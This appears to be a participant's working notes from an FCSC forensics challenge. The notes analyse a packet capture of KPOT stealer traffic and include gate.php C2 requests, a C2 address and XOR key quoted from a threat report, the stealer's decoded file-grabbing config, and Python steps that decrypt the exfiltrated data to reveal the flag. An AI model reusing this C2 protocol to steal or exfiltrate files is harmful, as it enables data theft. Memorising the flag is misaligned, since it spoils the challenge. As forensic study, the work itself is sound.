@@ -1,0 +1,164 @@
+In PCAP:
+
+HTTP
+    => some /gate.php
+
+https://www.proofpoint.com/us/threat-insight/post/new-kpot-v20-stealer-brings-zero-persistence-and-memory-features-silently-steal
+    C2: hxxp://5.188.60[.]131/a6Y5Qy3cF1sOmOKQ/gate.php
+    XOR key: Adx1zBXByhrzmq1e
+
+
+
+GET /o96xEVtEmxfoYNxf/gate.php HTTP/1.1
+Host: 104.27.140.49
+Accept-Encoding: identity
+Content-Type: application/x-www-form-urlencoded
+Connection: Keep-Alive
+
+HTTP/1.1 403 Forbidden
+Date: Thu, 02 Apr 2020 19:07:28 GMT
+Content-Type: text/plain; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: close
+Set-Cookie: __cfduid=d2a77f4180daa52231fac7750c2ccc6181585854448; expires=Sat, 02-May-20 19:07:28 GMT; path=/; domain=.104.27.140.49; HttpOnly; SameSite=Lax
+Cache-Control: max-age=15
+Expires: Thu, 02 Apr 2020 19:07:43 GMT
+Vary: Accept-Encoding
+Server: cloudflare
+CF-RAY: 57dcd53d099bcd77-CDG
+
+error code: 1003
+
+
+"7174","44.655584","192.168.4.129","203.0.113.42","HTTP","230","GET /Ym9ubmVfcGlzdGVf/gate.php HTTP/1.1 "
+
+tcp.stream eq 93:
+
+    GET /Ym9ubmVfcGlzdGVf/gate.php HTTP/1.1
+    Host: 203.0.113.42 
+    Accept-Encoding: identity
+    Content-Type: application/x-www-form-urlencoded
+    Connection: Keep-Alive
+
+    HTTP/1.1 200 OK
+    Server: nginx
+    Date: Thu, 02 Apr 2020 19:07:33 GMT
+    Content-Type: text/html; charset=UTF-8
+    Transfer-Encoding: chunked
+    Connection: keep-alive
+    X-Powered-By: PHP/5.4.16
+
+    RHVdQ1V8BFVHAgRSAGNZRisbKDYoBXgpKW0HUgl8WUZMal1HXWIGU0Vtaid0HiE7ORszEhQ8UQUCU2o8dgApNDYBPiw7ZhsIGVUZSR8mEAJYGzM0Ng13JjNgajwUMxgGECUYEkETaiMkc3chdAA3KUQbMzQ2DXcmM2BqPABiWkIrGyg2KAV4KSltUQZCORwZBBsYCxATaiMkc3chdAA3KV5qGAsQYGo7MWB0IXMXOikrYRkAAT5FFhlUXA9UdzQyETcHBws8ajsxYHQhcxc6KSt0MywjHnQmNHdnPG5iNykwASA6KQFqOyltcSZ9GyU7KxszLCAJeS07f2o8
+    
+    POST /Ym9ubmVfcGlzdGVf/gate.php HTTP/1.1
+    Host: 203.0.113.42 
+    Accept-Encoding: identity
+    Content-Type: application/x-www-form-urlencoded
+    Connection: Keep-Alive
+    Content-Length: 147
+
+    +.>24	t1)bI.B`...6=..~xP...Ccf...6_	I.Z..W."\cE3.i..U/.2.FG.U \..%.,".f'|I.U.7PGB|[B\u.R.Q
+    PPkZ.. Z..zW].....1
+    .F%_.S)..D.
+    ZSg[B.%
+    .]{TS.8j'c.835.3HTTP/1.1 200 OK
+
+    Server: nginx
+    Date: Thu, 02 Apr 2020 19:07:36 GMT
+    Content-Type: text/html; charset=UTF-8
+    Transfer-Encoding: chunked
+    Connection: keep-alive
+    X-Powered-By: PHP/5.4.16
+
+    OK
+
+=> http_stream_exfil.bin
+
+
+Proto on port 29001:
+    ip.addr==192.168.4.129 && tcp.port==41104 && ip.addr==178.63.138.17 && tcp.port==29001
+        => www.w5ubg7ox6fhlhfdq.com
+            TLSv1.2
+
+
+Première trace:
+    2656	37.377541	192.168.4.129	198.54.117.197	HTTP	217	GET /lmpUNlwDfoybeulu/gate.php HTTP/1.1 
+    => Le malware a été DL avant
+        ouverture de Youtub
+        et www.w5ubg7ox6fhlhfdq.com:29001 en HTTPS, très suspect
+
+
+Base64 reçu par GET:
+
+    00000000: 4475 5d43 557c 0455 4702 0452 0063 5946  Du]CU|.UG..R.cYF
+    00000010: 2b1b 2836 2805 7829 296d 0752 097c 5946  +.(6(.x))m.R.|YF
+    00000020: 4c6a 5d47 5d62 0653 456d 6a27 741e 213b  Lj]G]b.SEmj't.!;
+    00000030: 391b 3312 143c 5105 0253 6a3c 7600 2934  9.3..<Q..Sj<v.)4
+    00000040: 3601 3e2c 3b66 1b08 1955 1949 1f26 1002  6.>,;f...U.I.&..
+    00000050: 581b 3334 360d 7726 3360 6a3c 1433 1806  X.346.w&3`j<.3..
+    00000060: 1025 1812 4113 6a23 2473 7721 7400 3729  .%..A.j#$sw!t.7)
+    00000070: 441b 3334 360d 7726 3360 6a3c 0062 5a42  D.346.w&3`j<.bZB
+    00000080: 2b1b 2836 2805 7829 296d 5106 4239 1c19  +.(6(.x))mQ.B9..
+    00000090: 041b 180b 1013 6a23 2473 7721 7400 3729  ......j#$sw!t.7)
+    000000a0: 5e6a 180b 1060 6a3b 3160 7421 7317 3a29  ^j...`j;1`t!s.:)
+    000000b0: 2b61 1900 013e 4516 1954 5c0f 5477 3432  +a...>E..T\.Tw42
+    000000c0: 1137 0707 0b3c 6a3b 3160 7421 7317 3a29  .7...<j;1`t!s.:)
+    000000d0: 2b74 332c 231e 7426 3477 673c 6e62 3729  +t3,#.t&4wg<nb7)
+    000000e0: 3001 203a 2901 6a3b 296d 7126 7d1b 253b  0. :).j;)mq&}.%;
+    000000f0: 2b1b 332c 2009 792d 3b7f 6a3c            +.3, .y-;.j<
+
+
+LD_LIBRARY_PATH=/opt/zeek/lib /opt/zeek/bin/zeek -Cr pws.pcap
+
+
+https://github.com/EmergingThreats/threatresearch/tree/master/kpot_stealer
+
+XOR with a key ?
+
+plaintext like:
+    111111111111100__DELIMM__A.B.C.D__DELIMM__appdata__GRABBER__*.log,*.txt,__GRABBER__%appdata%__GRABBER__0__GRABBER__1024__DELIMM__desktop_txt__GRABBER__*.txt,__GRABBER__%userprofile%\Desktop__GRABBER__0__GRABBER__150__DELIMM____DELIMM____DELIMM__
+
+
+>>> bytes(g^k for g, k in zip(GET, b'uDlrdM5dv35c1Rhw'*len(GET)))
+b'1111111111111111^_DDLHMM_^218.119.159/373^_DELILL__`pqdat`__GRACCER^_+.lof,*.txu-__FR@BBES__%apqeat`%^_GR@BBER_^1__FR@BBES__1025^_DDLHMM_^desktnq_tyt^_GR@BBER_^+.tyt-__GSABBER^^%uresprogile%\\Edskuoq__GSABBER^^0_^GSABBDR__0_^EELHML___^DELIML^__^DDLIML__'
+not right, but almost
+
+>>> bytes(g^k for g, k in zip(GET, b'tDlsdL5dv25c1Rhv'*len(GET)))
+b'0110101110111110__DELIMM__218.108.149.373__DELIMM__appdata__GRABBER__*.log,*.txt,__GRABBER__%appdata%__GRABBER__0__GRABBER__1024__DELIMM__desktop_txt__GRABBER__*.txt,__GRABBER__%userprofile%\\Desktop__GRABBER__0__GRABBER__0__DELIMM____DELIMM____DELIMM__'
+
+Decrypt POST-ed data:
+
+>>> POST[849+5:849+5+147]
+b'+.>24\tt1)bI.B`...6=..~xP...Ccf...6_\tI.Z..W."\\cE3.i..U/.2.FG.U \\..%.,".f\'|I.U.7PGB|[B\\u.R.Q\nPPkZ.. Z..zW].....1\n.F%_.S)..D.\nZSg[B.%\n.]{TS.8j\'c.835.3'
+
+>>> bytes(p^k for p, k in zip(POST[849+5:849+5+147], b'tDlsdL5dv25c1Rhv'*147))
+b'_jRAPEAU_P|Ms2FXZrQ]J2M4X\x1c\x1b R4FXZr3z-boJXe\x1bAm1-EZ-B]1c\x1bVXtrMdr4XZaB_FbSC\n{\x1b6\x1fe81687189\x1b6Xc?3a92XZd6]J6b9X\x1c\x1bM\x1fcbX2a3]7e\x1bJ2\x1c?9b534Zaf]97a7X\n_DR|PEAj_'
+
+Almost...
+
+    >>> KEY
+    bytearray(b'tjlsdm5dv25c1Rhv')
+
+    print('  0123456789abcdef');print('\n'.join(repr(bytes(g^k for g, k in zip(POST[849+5:849+5+147][i:i+16],KEY))) for i in range(0, 147,16)))
+      0123456789abcdef
+    b'_DRAPdAU_P|Ms2FX'
+    b'Z\\Q]J\x13M4X\x1c\x1b R4FX'
+    b'Z\\3z-CoJXe\x1bAm1-E'
+    b'Z\x03B]1B\x1bVXtrMdr4X'
+    b'ZOB_FCSC\n{\x1b6\x1fe81'
+    b'6\x16718\x18\x1b6Xc?3a92X'
+    b'ZJ6]J\x17b9X\x1c\x1bM\x1fcbX'
+    b'2O3]7D\x1bJ2\x1c?9b534'
+    b'ZOf]9\x16a7X\n_DR|PE'
+    b'AD_'
+
+
+
+MAIS ça été mangled :'(
+
+>>> POST=pcap[28437913:28437913+147]
+>>> POST
+b'+\x00>24\tt1)bI\x16B`\x18\x13\x016=\x06\x01~xP\x1a\x13\x15Ccf\x1b\x05\x016_\tI\x1aZ\x10\x04W\x18"\\cE3\x00i\x1a\x1cU/\x042\x19FG\x06U \\\x06\x11%\x19,"\x0ff\'|I\x01U\x087PGB|[B\\u\x0cR\x13Q\rPPkZ\x17\x17 Z\x15\x01zW]\x15\x02\x06\x00\x071\r\x12F%_\x12S)\x02\x05D\x02\rZSg[B\x16%\r\x16]{TS\x0b8j\'c\x13835\x113'
+
+>>> print(bytes(g^k for g, k in zip(POST, KEY*20)))
+b'_DRAPEAU_P|us2peurQue2M4l!  R4ssur3z-Votre-Am1-Et-vo1c1Votredr4peau_FCSC\n{469e8168718996ec83a92acd6fe6b9c03c6ced2a3a7e7a2089b534baae97a7}\n_DRAPEAU_'
